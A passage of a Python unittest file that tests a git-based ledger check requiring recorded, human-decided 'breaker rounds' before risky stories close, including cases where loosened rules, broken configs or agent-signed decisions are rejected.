"""HARN-021: a risky story closes only after cold breaker rounds, recorded in its file (`## Breaker rounds`) and
checked by `ledger.py check` (BREAKER_MISSING, BREAKER_UNRESOLVED, BREAKER_CONFIG, BREAKER_BAD_ENTRY).
Run: python3 -m unittest tests.test_breaker  (from the repo root, or `discover -s tests`)

Everything runs against real git with local remotes, as tests/test_ledger.py does (its GitRepo)."""
import json
import re
import tomllib
import unittest
from pathlib import Path

from test_ledger import LEDGER, GitRepo, LedgerCase

ROOT = Path(__file__).resolve().parents[1]
RISKY = ".keelokit/risky.toml"
RISKY_TOML = ('rounds = 3\ndimensions = ["security"]\n'
              'paths = [".keelokit/bin/**", "scripts/verify.sh", "**/migrations/**"]\n')
PR_ENV = {"GITHUB_EVENT_NAME": "pull_request", "GITHUB_BASE_REF": "main", "CI": "true"}


def story(sid: str, touches: tuple = ("apps/web/page.ts",), dimensions: tuple = ("logic",), risky: str | None = None,
          rounds: str | None = None) -> str:
    """A story file; `rounds`: the lines under `## Breaker rounds` (None: no such section)."""
    t = ", ".join(json.dumps(p) for p in touches)
    d = ", ".join(json.dumps(x) for x in dimensions)
    extra = f"risky = {risky}\n" if risky is not None else ""
    text = (f'+++\nid = "{sid}"\nepic = "{sid.split("-")[0]}"\ntitle = "Title of {sid}"\nwave = 1\n'
            f'depends_on = []\ntouches = [{t}]\ndimensions = [{d}]\n{extra}+++\n# Title of {sid}\n\n'
            '```gherkin\nScenario: [S1] works\n```\n')
    if rounds is not None:
        text += "\n## Breaker rounds\n" + rounds
    return text


def path_of(sid: str) -> str:
    return f"backlog/stories/{sid}-s.md"


def round_line(n: int, head: str, result: str = "clean") -> str:
    return f"- Round {n} · head {head} · {result}\n"


HEAD = "a" * 40
PLACEHOLDERS = ("a" * 40, "b" * 40, *(str(n) * 40 for n in range(10)))


def harness(repo: GitRepo, message: str, files: dict) -> str:
    """A commit of `files`, harness files included (`git add -f`: /.keelokit/ is excluded in GitRepo)."""
    for rel, text in files.items():
        repo.write(rel, text)
    repo.git("add", "-A")
    repo.git("add", "-f", *files)
    repo.git("commit", "-q", "-m", message, when=repo.next_date())
    return repo.sha()


class BreakerCase(LedgerCase):
    def project(self, stories: dict, risky: str | None = RISKY_TOML, since_first: bool = True) -> GitRepo:
        """A published trunk: the stories planned, the adoption commit (`[ledger] since`, in the work tree's
        state.toml), then risky.toml committed (when given). Nothing is closed yet."""
        self.repos = getattr(self, "repos", 0) + 1
        repo = GitRepo(self.tmp, name=f"work{self.repos}")
        repo.commit("docs: plan\n\nNo-story: docs", {path_of(sid): text for sid, text in stories.items()})
        since = repo.commit("chore: adopt the ledger\n\nNo-story: harness")
        if risky is not None:
            self.added = harness(repo, "chore: risky stories\n\nNo-story: harness", {RISKY: risky})
        repo.publish()
        repo.state(f'[ledger]\nsince = "{since}"\nenforce = "block"\n')
        self.since = since
        return repo

    def close(self, repo: GitRepo, sid: str, files: dict | None = None, rounds: str | None = None,
              publish: bool = True) -> str:
        """The story's Story: commit on the trunk; `rounds` rewrites its file with that section first."""
        files = dict(files or {})
        if rounds is not None:
            # A story built as build-story says: its changes in a Part-of: commit, the round on that head, then the
            # Story: commit that records the round. Placeholder heads (HEAD, "b" * 40, "1" * 40, …) become that head:
            # since HARN-022 a round counts only when its head is a commit the close reaches (ESC-371) and the last
            # clean one reaches every risky commit of the story, the Story: commit included (round 5, 6a).
            work = {k: v for k, v in files.items() if k != path_of(sid)}
            if work:
                repo.commit(f"feat: {sid} work\n\nPart-of: {sid}", work)
                files = {k: v for k, v in files.items() if k == path_of(sid)}
            for ph in PLACEHOLDERS:
                rounds = rounds.replace(f"head {ph} ", f"head {repo.sha()} ")
            current = (repo.path / path_of(sid)).read_text()
            files[path_of(sid)] = current.split("\n## Breaker rounds\n")[0] + "\n## Breaker rounds\n" + rounds
        sha = repo.commit(f"feat: {sid}\n\nWhat was decided.\n\nStory: {sid}", files)
        if publish:
            repo.publish()
        return sha

    def check(self, repo: GitRepo, *args: str, env: dict | None = None) -> tuple[int, list[dict]]:
        r = repo.ledger("check", "--json", *args, extra_env=env)
        self.assertNotIn("Traceback", r.stderr)
        self.assertIn(r.returncode, (0, 1), r.stdout + r.stderr)
        diffs = json.loads(r.stdout)["diffs"]
        self.assertEqual(r.returncode, 1 if any(d["level"] == "error" for d in diffs) else 0, diffs)
        return r.returncode, diffs

    @staticmethod
    def breaker(diffs: list[dict]) -> list[tuple[str, str, str]]:
        """(level, code, the story the detail names first) of each BREAKER_* difference."""
        found = []
        for d in diffs:
            if d["code"].startswith("BREAKER_"):
                m = re.search(r"[A-Z][A-Z0-9]*-[0-9]+", d["detail"])
                found.append((d["level"], d["code"], m.group(0) if m else ""))
        return found


class BreakerRiskyTest(BreakerCase):
    """S1: what makes a story risky."""

    def test_HARN_021_S1_risky_by_front_matter_dimension_touch_or_a_commit_path(self):
        stories = {
            "AUTH-001": story("AUTH-001", risky="true"),
            "AUTH-002": story("AUTH-002", dimensions=("logic", "security")),
            "AUTH-003": story("AUTH-003", touches=(".keelokit/bin/guard.py",)),
            "AUTH-004": story("AUTH-004", touches=("scripts",)),            # a directory that holds a risky file
            "AUTH-005": story("AUTH-005", touches=("apps/api/**",)),        # a glob that can hold migrations/
            "AUTH-006": story("AUTH-006", touches=("apps/web/a.ts",)),      # its commit changes a migration
            "AUTH-007": story("AUTH-007", touches=("docs/guide.md",)),      # nothing risky
            "AUTH-008": story("AUTH-008", dimensions=("security",), risky="false"),  # cannot opt out
            "AUTH-009": story("AUTH-009", touches=("apps/api/db/migrations/0002.sql",)),
        }
        repo = self.project(stories)
        for sid in stories:
            files = {"apps/api/db/migrations/0001.sql": "create table t();\n"} if sid == "AUTH-006" else None
            self.close(repo, sid, files, publish=False)
        repo.publish()
        code, diffs = self.check(repo)
        missing = {s for level, c, s in self.breaker(diffs) if c == "BREAKER_MISSING" and level == "error"}
        self.assertEqual(missing, {"AUTH-001", "AUTH-002", "AUTH-003", "AUTH-004", "AUTH-005", "AUTH-006",
                                   "AUTH-008", "AUTH-009"})
        self.assertEqual(code, 1)

    def test_HARN_021_S1_ledger_risky_says_whether_and_why_and_the_cap(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=(".keelokit/bin/ledger.py",)),
                             "AUTH-002": story("AUTH-002", touches=("docs/a.md",))})
        r = repo.ledger("risky", "AUTH-001")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertRegex(r.stdout, r"AUTH-001: risky")
        self.assertIn(".keelokit/bin/**", r.stdout)
        self.assertIn("3", r.stdout)
        r = repo.ledger("risky", "AUTH-002")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("AUTH-002: not risky", r.stdout)
        self.assertEqual(repo.ledger("risky", "NOPE-404").returncode, 2)

    def test_HARN_021_S1_ledger_risky_reads_what_the_branch_changes(self):
        """A story whose touches say nothing risky, on a branch whose commits change a risky path."""
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("apps/web/a.ts",))})
        repo.git("checkout", "-q", "-b", "feature")
        repo.commit("wip\n\nPart-of: AUTH-001", {"scripts/verify.sh": "echo\n"})
        r = repo.ledger("risky", "AUTH-001")
        self.assertIn("AUTH-001: risky", r.stdout)
        self.assertIn("scripts/verify.sh", r.stdout)


class BreakerTemplateTest(unittest.TestCase):
    """S2: the template's defaults, owned by the product."""

    def test_HARN_021_S2_the_template_ships_defaults_the_product_owns(self):
        data = tomllib.loads((ROOT / "template/.keelokit/risky.toml").read_text())
        self.assertEqual(data["rounds"], 3)
        self.assertTrue({"security", "auth", "integrity", "data"} <= set(data["dimensions"]))
        paths = data["paths"]
        for needle in (".githooks/", ".github/workflows/", ".keelokit/bin/", "scripts/", "migrations/", "auth/"):
            with self.subTest(needle=needle):
                self.assertTrue(any(needle in p for p in paths), paths)
        text = (ROOT / "copier.yml").read_text()
        skip = text[text.index("_skip_if_exists:"):]
        self.assertIn(".keelokit/risky.toml", re.findall(r"^\s*- (\.keelokit/[^\s#]+)", skip, re.M))
        own = tomllib.loads((ROOT / ".keelokit/risky.toml").read_text())
        self.assertIn(".keelokit/bin/**", own["paths"], "this repo's own file names its own risky code")

    def test_HARN_021_S2_the_two_ledger_copies_are_identical(self):
        self.assertEqual((ROOT / ".keelokit/bin/ledger.py").read_bytes(), LEDGER.read_bytes())


class BreakerMissingTest(BreakerCase):
    """S3: a risky story closed with no round."""

    def test_HARN_021_S3_a_risky_story_closed_with_no_round_is_an_error(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",)),
                             "AUTH-002": story("AUTH-002", touches=("scripts/verify.sh",), rounds="")})
        self.close(repo, "AUTH-001", publish=False)
        self.close(repo, "AUTH-002")
        code, diffs = self.check(repo)
        self.assertEqual(code, 1)
        self.assertEqual(sorted(self.breaker(diffs)), [("error", "BREAKER_MISSING", "AUTH-001"),
                                                       ("error", "BREAKER_MISSING", "AUTH-002")])
        detail = next(d["detail"] for d in diffs if d["code"] == "BREAKER_MISSING")
        self.assertIn("scripts/verify.sh", detail)
        self.assertIn("## Breaker rounds", detail)

    def test_HARN_021_S3_recording_the_rounds_later_on_the_trunk_clears_it(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        close = self.close(repo, "AUTH-001")
        self.assertEqual(self.check(repo)[0], 1)
        repo.commit("docs: AUTH-001's rounds\n\nPart-of: AUTH-001",
                    {path_of("AUTH-001"): story("AUTH-001", touches=("scripts/verify.sh",),
                                                rounds=round_line(1, close))})
        repo.publish()
        self.assertEqual(self.breaker(self.check(repo)[1]), [])

    def test_HARN_021_S3_a_reverted_close_is_not_closed(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        sha = self.close(repo, "AUTH-001", publish=False)
        repo.git("revert", "--no-edit", sha, when=repo.next_date())
        repo.git("commit", "-q", "--amend", "-m", f"Revert\n\nThis reverts commit {sha}.\n\nPart-of: AUTH-001")
        repo.publish()
        self.assertEqual(self.breaker(self.check(repo)[1]), [])


class BreakerRoundsTest(BreakerCase):
    """S4: the last round decides."""

    def run_rounds(self, rounds: str) -> list[tuple[str, str, str]]:
        repo = self.project({"AUTH-001": story("AUTH-001", touches=(".keelokit/bin/x.py",))})
        self.close(repo, "AUTH-001", rounds=rounds)
        return self.breaker(self.check(repo)[1])

    def test_HARN_021_S4_a_clean_last_round_passes(self):
        rounds = round_line(1, "b" * 40, "2 findings: ESC-1, ESC-2 · fixed in 1234567") + round_line(2, HEAD)
        self.assertEqual(self.run_rounds(rounds), [])

    def test_HARN_021_S4_details_under_a_round_are_allowed(self):
        rounds = round_line(1, HEAD) + "  The attacks run: 12, none reproduced.\n\n  More detail.\n"
        self.assertEqual(self.run_rounds(rounds), [])

    def test_HARN_021_S4_findings_left_without_a_decision_warn(self):
        rounds = round_line(1, "b" * 40, "1 finding: ESC-9 · fixed") + round_line(2, HEAD, "1 finding: ESC-10 open")
        self.assertEqual(self.run_rounds(rounds), [("warning", "BREAKER_UNRESOLVED", "AUTH-001")])

    def test_HARN_021_S4_a_person_decision_after_the_last_round_clears_it(self):
        rounds = (round_line(1, HEAD, "1 finding: ESC-10 open")
                  + "- Decision · Leo · 2026-11-25 · land it; ESC-10 goes to HARN-099\n")
        self.assertEqual(self.run_rounds(rounds), [])

    def test_HARN_021_S4_a_decision_before_the_last_round_does_not_count(self):
        rounds = (round_line(1, "b" * 40, "1 finding open") + "- Decision · Leo · 2026-11-25 · one more round\n"
                  + round_line(2, HEAD, "1 finding: ESC-11 open"))
        self.assertEqual(self.run_rounds(rounds), [("warning", "BREAKER_UNRESOLVED", "AUTH-001")])

    def test_HARN_021_S4_a_decision_by_an_agent_is_no_decision(self):
        rounds = round_line(1, HEAD, "1 finding open") + "- Decision · Claude · 2026-11-25 · fine as it is\n"
        found = self.run_rounds(rounds)
        self.assertIn(("warning", "BREAKER_UNRESOLVED", "AUTH-001"), found)
        self.assertIn(("warning", "BREAKER_BAD_ENTRY", "AUTH-001"), found)

    def test_HARN_021_S4_clean_means_clean(self):
        for result in ("clean-ish: 2 findings left", "clean but ESC-3 open", "not clean"):
            with self.subTest(result=result):
                self.assertEqual(self.run_rounds(round_line(1, HEAD, result)),
                                 [("warning", "BREAKER_UNRESOLVED", "AUTH-001")])


class BreakerHistoryTest(BreakerCase):
    """S5: existing history is not flagged."""

    def test_HARN_021_S5_stories_closed_before_risky_toml_arrived_are_exempt(self):
        stories = {"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",)),
                   "AUTH-002": story("AUTH-002", touches=("scripts/verify.sh",))}
        repo = self.project(stories, risky=None)
        self.close(repo, "AUTH-001")
        self.assertEqual(self.breaker(self.check(repo)[1]), [], "no risky.toml: no rule")
        harness(repo, "chore: risky stories\n\nNo-story: harness", {RISKY: RISKY_TOML})
        self.close(repo, "AUTH-002")
        before = (repo.path / path_of("AUTH-001")).read_text()
        self.assertEqual(self.breaker(self.check(repo)[1]), [("error", "BREAKER_MISSING", "AUTH-002")])
        self.assertEqual((repo.path / path_of("AUTH-001")).read_text(), before, "no story file is edited")

    def test_HARN_021_S5_a_branch_forked_before_risky_toml_and_merged_after_is_checked(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))}, risky=None)
        repo.git("checkout", "-q", "-b", "old")
        repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001")
        repo.git("checkout", "-q", "main")
        harness(repo, "chore: risky stories\n\nNo-story: harness", {RISKY: RISKY_TOML})
        repo.merge("old", "Merge pull request #3 from x/old")
        repo.publish()
        self.assertEqual(self.breaker(self.check(repo)[1]), [("error", "BREAKER_MISSING", "AUTH-001")])

    def test_HARN_021_S5_risky_toml_since_exempts_up_to_that_commit(self):
        stories = {"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",)),
                   "AUTH-002": story("AUTH-002", touches=("scripts/verify.sh",))}
        # Since ESC-340 only the first version's `since` counts: it names work already done on a branch that lands
        # after the file (an adopted project's start); a story closed after that is judged.
        repo = self.project(stories, risky=None)
        repo.git("checkout", "-q", "-b", "old")
        first = repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001")
        repo.git("checkout", "-q", "main")
        harness(repo, "chore: the rule from here\n\nNo-story: harness", {RISKY: f'since = "{first}"\n' + RISKY_TOML})
        repo.merge("old", "Merge pull request #2 from x/old")
        repo.publish()
        self.close(repo, "AUTH-002")
        self.assertEqual(self.breaker(self.check(repo)[1]), [("error", "BREAKER_MISSING", "AUTH-002")])

    def test_HARN_021_S5_a_since_that_names_no_commit_exempts_nothing_and_warns(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))},
                            risky='since = "' + "f" * 40 + '"\n' + RISKY_TOML)
        self.close(repo, "AUTH-001")
        found = self.breaker(self.check(repo)[1])
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), found)
        self.assertIn("BREAKER_CONFIG", [c for _, c, _ in found])

    def test_HARN_021_S5_before_ledger_since_is_exempt(self):
        repo = GitRepo(self.tmp)
        repo.commit("docs: plan\n\nNo-story: docs", {path_of("AUTH-001"): story("AUTH-001", touches=("scripts/x",))})
        harness(repo, "chore: risky\n\nNo-story: harness", {RISKY: 'paths = ["scripts/**"]\n'})
        repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001")
        since = repo.commit("chore: adopt\n\nNo-story: harness")
        repo.publish()
        repo.state(f'[ledger]\nsince = "{since}"\n')
        self.assertEqual(self.breaker(self.check(repo)[1]), [])
        repo.state("[ledger]\n")  # without [ledger] since the rule holds from risky.toml's arrival (ESC-313)
        self.assertEqual(self.breaker(self.check(repo)[1]), [("error", "BREAKER_MISSING", "AUTH-001")])


class BreakerPullRequestTest(BreakerCase):
    """S6: a pull request is judged as it would land, by the base's rules."""

    def pull_request(self, repo: GitRepo, branch: str, number: int = 7) -> GitRepo:
        """What actions/checkout does for a pull request: every branch, then GitHub's merge, detached."""
        main, tip = repo.sha("origin/main"), repo.sha(f"origin/{branch}")
        state = (repo.path / ".keelokit/state.toml").read_text()  # the work tree's, before the checkouts
        repo.git("checkout", "-q", "--detach", main)
        repo.git("merge", "-q", "--no-ff", "-m", f"Merge {tip} into {main}", tip, when=repo.next_date())
        repo.git("push", "-q", "origin", f"HEAD:refs/pull/{number}/merge")
        repo.git("checkout", "-q", "main")
        ci = self.tmp / f"ci-{number}"
        ci.mkdir()
        run = GitRepo.run
        run(repo, ["git", "init", "-q"], ci)
        run(repo, ["git", "remote", "add", "origin", f"file://{repo.bare}"], ci)
        run(repo, ["git", "fetch", "-q", "--prune", "origin", "+refs/heads/*:refs/remotes/origin/*"], ci)
        run(repo, ["git", "fetch", "-q", "origin", f"+refs/pull/{number}/merge:refs/remotes/pull/{number}/merge"], ci)
        run(repo, ["git", "checkout", "-q", "--detach", f"refs/remotes/pull/{number}/merge"], ci)
        clone = GitRepo(self.tmp, existing=ci)
        clone.state(state)
        return clone

    def branch(self, repo: GitRepo, sid: str, files: dict, harness_files: dict | None = None) -> None:
        repo.git("checkout", "-q", "-b", "feature")
        if harness_files:
            harness(repo, f"chore: loosen\n\nPart-of: {sid}", harness_files)
        repo.commit(f"feat: {sid}\n\nWhy.\n\nStory: {sid}", files)
        repo.git("push", "-q", "origin", "feature")
        repo.git("checkout", "-q", "main")

    def test_HARN_021_S6_a_pull_request_closing_a_risky_story_without_rounds_fails(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        self.branch(repo, "AUTH-001", {"scripts/verify.sh": "echo\n"})
        code, diffs = self.check(self.pull_request(repo, "feature"), "--ci", env=PR_ENV)
        self.assertEqual(code, 1)
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(diffs))

    def test_HARN_021_S6_a_pull_request_that_loosens_the_rules_is_judged_by_the_base(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        self.branch(repo, "AUTH-001", {path_of("AUTH-001"): story("AUTH-001", touches=("docs/a.md",)),
                                       "scripts/verify.sh": "echo\n"},
                    harness_files={RISKY: "paths = []\ndimensions = []\n"})
        code, diffs = self.check(self.pull_request(repo, "feature"), "--ci", env=PR_ENV)
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(diffs))

    def test_HARN_021_S6_a_pull_request_with_its_rounds_passes(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        self.branch(repo, "AUTH-001", {path_of("AUTH-001"): story("AUTH-001", touches=("scripts/verify.sh",),
                                                                  rounds=round_line(1, repo.sha()))})
        code, diffs = self.check(self.pull_request(repo, "feature"), "--ci", env=PR_ENV)
        self.assertEqual(self.breaker(diffs), [])

    def test_HARN_021_S6_rules_ref_reads_risky_toml_from_that_commit(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))},
                            risky="paths = []\n")
        self.close(repo, "AUTH-001")
        self.assertEqual(self.breaker(self.check(repo)[1]), [])
        repo.git("checkout", "-q", "-b", "rules")
        # --rules-ref reads [ledger] from REV's committed state.toml too (LEDGER-013), so REV commits it.
        rules = harness(repo, "chore: stricter\n\nNo-story: harness",
                        {RISKY: RISKY_TOML, ".keelokit/state.toml": f'[ledger]\nsince = "{self.since}"\n'})
        repo.git("checkout", "-q", "main")
        found = self.breaker(self.check(repo, "--rules-ref", rules)[1])
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), found)


class BreakerBrokenTest(BreakerCase):
    """S7: a broken record fails closed."""

    def test_HARN_021_S7_a_risky_toml_that_is_not_toml_makes_every_closed_story_risky(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("docs/a.md",))}, risky="paths = [\n")
        self.close(repo, "AUTH-001")
        code, diffs = self.check(repo)
        found = self.breaker(diffs)
        self.assertIn("BREAKER_CONFIG", [c for lvl, c, _ in found if lvl == "error"])
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), found)

    def test_HARN_021_S7_wrong_types_are_a_config_error(self):
        for bad in ('rounds = "three"\n', "rounds = 0\n", 'paths = "scripts/**"\n', "paths = [1]\n",
                    'dimensions = "security"\n', "since = 12\n"):
            with self.subTest(bad=bad):
                self.repos = getattr(self, "repos", 0) + 1
                repo = GitRepo(self.tmp, name=f"work{self.repos}")
                repo.commit("docs: plan\n\nNo-story: docs", {path_of("AUTH-001"): story("AUTH-001")})
                since = repo.commit("chore: adopt\n\nNo-story: harness")
                harness(repo, "chore: risky\n\nNo-story: harness", {RISKY: bad})
                repo.publish()
                repo.state(f'[ledger]\nsince = "{since}"\n')
                code, diffs = self.check(repo)
                self.assertIn(("error", "BREAKER_CONFIG", ""), [(l, c, "") for l, c, _ in self.breaker(diffs)])

    def test_HARN_021_S7_an_entry_that_is_no_round_nor_decision_warns(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        self.close(repo, "AUTH-001", rounds=round_line(1, HEAD) + "- Round two was clean too\n")
        self.assertEqual(self.breaker(self.check(repo)[1]), [("warning", "BREAKER_BAD_ENTRY", "AUTH-001")])

    def test_HARN_021_S7_a_round_with_a_short_head_is_no_round(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        self.close(repo, "AUTH-001", rounds=round_line(1, "abc12"))  # under 7 hex digits: no head
        found = self.breaker(self.check(repo)[1])
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), found)
        self.assertIn(("warning", "BREAKER_BAD_ENTRY", "AUTH-001"), found)

    def test_HARN_021_S7_a_rounds_heading_inside_a_code_fence_is_no_record(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("scripts/verify.sh",))})
        text = story("AUTH-001", touches=("scripts/verify.sh",)) + "\n```\n## Breaker rounds\n" + round_line(1, HEAD) + "```\n"
        self.close(repo, "AUTH-001", {path_of("AUTH-001"): text})
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))


class BreakerProcessTextTest(unittest.TestCase):
    """S8: the build runs the loop (the skill and the agent say so)."""

    def test_HARN_021_S8_the_skill_and_the_breaker_agent_describe_the_cold_loop(self):
        skill = (ROOT / "skills/build-story/SKILL.md").read_text()
        agent = (ROOT / "agents/breaker.md").read_text()
        for text, needles in ((skill, ["ledger.py risky", "cold", "new breaker", "reproduced", "fails before",
                                       "## Breaker rounds", "- Round <n> · head <sha>", "Decision", "rounds",
                                       "BREAKER_MISSING", "never the builder's"]),
                              (agent, ["Mode C", "cold", "reproduced", "repro", "never"])):
            for needle in needles:
                with self.subTest(needle=needle):
                    self.assertIn(needle.lower(), text.lower())

    def test_HARN_021_S8_the_generated_project_is_told(self):
        for rel in ("template/.keelokit/harness/execution-protocol.md", "template/AGENTS.md.jinja", "docs/design.md",
                    "docs/ledger.md"):
            with self.subTest(rel=rel):
                text = (ROOT / rel).read_text()
                self.assertIn("risky.toml", text)
                self.assertIn("Breaker rounds", text)


class BreakerRound1Test(BreakerCase):
    """Breaker round 1 (ESC-311..315): each finding reproduced as a failing test first."""

    def test_HARN_021_S5_a_side_branch_that_adds_its_own_risky_toml_exempts_nothing_ESC_311(self):
        repo = self.project({"AUTH-001": story("AUTH-001", dimensions=("security",))}, risky=None)
        repo.git("checkout", "-q", "-b", "side")
        repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001")
        harness(repo, "chore: my own rules\n\nPart-of: AUTH-001", {RISKY: RISKY_TOML + "# the side's\n"})
        repo.git("checkout", "-q", "main")
        harness(repo, "chore: risky stories\n\nNo-story: harness", {RISKY: RISKY_TOML})
        repo.git("merge", "-q", "--no-ff", "--no-commit", "side", check=False)
        harness(repo, "Merge pull request #4 from x/side", {RISKY: RISKY_TOML + "# both\n"})  # differs from both
        repo.publish()
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S5_deleting_and_re_adding_risky_toml_exempts_nothing_ESC_311(self):
        repo = self.project({"AUTH-001": story("AUTH-001", dimensions=("security",))})
        self.close(repo, "AUTH-001")
        repo.git("rm", "-q", RISKY)
        repo.git("commit", "-q", "-m", "chore: drop\n\nNo-story: harness", when=repo.next_date())
        harness(repo, "chore: back\n\nNo-story: harness", {RISKY: RISKY_TOML})
        repo.publish()
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S6_a_pull_request_that_changes_the_ledger_settings_is_still_judged_ESC_312(self):
        for setting in ('stories = "elsewhere/*.md"\n', 'id_from = "filename"\n',
                        f'since = "SELF"\n'):
            with self.subTest(setting=setting):
                repo = self.project({"AUTH-001": story("AUTH-001", dimensions=("security",))})
                repo.git("checkout", "-q", "-b", "feature")
                text = f'[ledger]\nenforce = "warn"\n' + (setting if "SELF" not in setting else "")
                harness(repo, "chore: tune ledger\n\nPart-of: AUTH-001", {".keelokit/state.toml": text})
                repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001")
                if "SELF" in setting:
                    harness(repo, "chore: since\n\nPart-of: AUTH-001",
                            {".keelokit/state.toml": text + f'since = "{repo.sha()}"\n'})
                repo.git("push", "-q", "origin", "feature")
                repo.git("checkout", "-q", "main")
                repo.state(f'[ledger]\nsince = "{self.since}"\n')
                clone = BreakerPullRequestTest.pull_request(self, repo, "feature", number=len(setting))
                clone.git("checkout", "-q", "--", ".keelokit/state.toml")  # the CI reads the PR's own file
                code, diffs = self.check(clone, "--ci", env=PR_ENV)
                self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(diffs))
                self.assertEqual(code, 1)

    def test_HARN_021_S5_without_ledger_since_the_rule_holds_from_risky_toml_ESC_313(self):
        for since in (None, "HEAD"):
            with self.subTest(since=since):
                repo = self.project({"AUTH-001": story("AUTH-001", dimensions=("security",))})
                repo.state("[ledger]\n" + (f'since = "{since}"\n' if since else ""))
                self.close(repo, "AUTH-001")
                self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S4_only_a_listed_decider_decides_ESC_314(self):
        rules = RISKY_TOML + 'deciders = ["Leo"]\n'
        for name, ok in (("Leo", True), ("leo", True), ("subagent", False), ("Opus 5.5", False),
                         ("ClaudeCode", False), ("Someone", False)):
            with self.subTest(name=name):
                repo = self.project({"AUTH-001": story("AUTH-001", touches=(".keelokit/bin/x.py",))}, risky=rules)
                self.close(repo, "AUTH-001", rounds=round_line(1, HEAD, "1 finding open")
                           + f"- Decision · {name} · 2026-11-25 · land it\n")
                found = self.breaker(self.check(repo)[1])
                self.assertEqual(("warning", "BREAKER_UNRESOLVED", "AUTH-001") in found, not ok, found)

    def test_HARN_021_S4_without_deciders_agent_like_names_are_no_decision_ESC_314(self):
        for name in ("subagent", "ClaudeCode", "the agents", "Opus 5.5", "claude_code", "Breaker2", "Sonnet"):
            with self.subTest(name=name):
                repo = self.project({"AUTH-001": story("AUTH-001", touches=(".keelokit/bin/x.py",))})
                self.close(repo, "AUTH-001", rounds=round_line(1, HEAD, "1 finding open")
                           + f"- Decision · {name} · 2026-11-25 · land it\n")
                self.assertIn(("warning", "BREAKER_UNRESOLVED", "AUTH-001"), self.breaker(self.check(repo)[1]))

    def test_HARN_021_S7_a_risky_toml_that_is_a_symlink_fails_closed_ESC_315(self):
        repo = self.project({"AUTH-001": story("AUTH-001", touches=("docs/a.md",))}, risky=None)
        repo.write("rules.toml", RISKY_TOML)
        (repo.path / ".keelokit").mkdir(exist_ok=True)
        (repo.path / RISKY).symlink_to("../rules.toml")
        repo.git("add", "-A")
        repo.git("add", "-f", RISKY)
        repo.git("commit", "-q", "-m", "chore: risky via a link\n\nNo-story: harness", when=repo.next_date())
        self.close(repo, "AUTH-001")
        found = self.breaker(self.check(repo)[1])
        self.assertIn("BREAKER_CONFIG", [c for lvl, c, _ in found if lvl == "error"])
        self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), found)


class BreakerRound2Test(BreakerCase):
    """Breaker round 2 (ESC-316..322): each finding reproduced as a failing test first."""

    def test_HARN_021_S3_a_story_file_deleted_or_broken_after_the_close_is_still_judged_ESC_316(self):
        for how in ("delete", "move", "break"):
            with self.subTest(how=how):
                repo = self.project({"AUTH-001": story("AUTH-001")})
                repo.state(f'[ledger]\nsince = "{self.since}"\nenforce = "warn"\n')
                self.close(repo, "AUTH-001", {"scripts/verify.sh": "echo\n"}, publish=False)
                if how == "delete":
                    repo.git("rm", "-q", path_of("AUTH-001"))
                    repo.git("commit", "-q", "-m", "docs: tidy\n\nNo-story: docs", when=repo.next_date())
                elif how == "move":
                    repo.git("mv", path_of("AUTH-001"), "AUTH-001.md")
                    repo.git("commit", "-q", "-m", "docs: tidy\n\nNo-story: docs", when=repo.next_date())
                else:
                    repo.commit("docs: tidy\n\nNo-story: docs", {path_of("AUTH-001"): "+++\nid = \n+++\n"})
                repo.publish()
                code, diffs = self.check(repo)
                self.assertIn(("error", "BREAKER_MISSING", "AUTH-001"), self.breaker(diffs))
                self.assertEqual(code, 1)

    def test_HARN_021_S6_a_pull_request_cannot_move_the_trunk_it_is_judged_on_ESC_317(self):
        repo = self.project({"AUTH-001": story("AUTH-001", dimensions=("security",))})
        state = f'[ledger]\nsince = "{self.since}"\n'
        harness(repo, "chore: commit the settings\n\nNo-story: harness", {".keelokit/state.toml": state})
        repo.git("push", "-q", "origin", "main:release")
        repo.publish()
        repo.git("checkout", "-q", "-b", "feature")
        harness(repo, "chore: trunk\n\nPart-of: AUTH-001", {".keelokit/state.toml": state + 'trunk = "release"\n'})
        repo.commit("feat: AUTH-001\n\nWhy.\n\nStory: AUTH-001")
